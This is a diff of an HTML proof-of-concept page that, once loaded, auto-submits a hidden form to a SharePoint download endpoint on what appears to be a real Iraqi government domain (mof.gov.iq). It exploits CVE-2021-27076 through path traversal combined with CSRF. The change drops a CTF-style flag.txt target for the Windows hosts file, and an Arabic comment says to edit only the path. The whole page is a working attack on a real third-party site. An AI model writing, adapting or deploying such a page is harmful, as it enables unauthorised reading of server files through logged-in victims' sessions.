@@ -2,15 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF + File Read Exploit (flag.txt)</title>
+  <title>CSRF + File Read Exploit</title>
 </head>
 <body onload="document.forms[0].submit()">
 
-  <h2>Attempting to Read flag.txt via CVE-2021-27076 + CSRF</h2>
-  <p>If the victim is logged into mof.gov.iq, this page will attempt to download "flag.txt" from the server root.</p>
+  <h2>Attempting File Read via CVE-2021-27076 + CSRF</h2>
+  <p>This page sends an automatic request to mof.gov.iq to try reading a file using a crafted path traversal.</p>
 
+  <!-- عدّل هنا فقط اسم الملف أو المسار -->
   <form method="GET" action="https://mof.gov.iq/_layouts/15/download.aspx">
-    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../flag.txt">
+    <input type="hidden" name="SourceUrl" value="/sites/test/../../../../../../Windows/System32/drivers/etc/hosts">
   </form>
 
 </body>
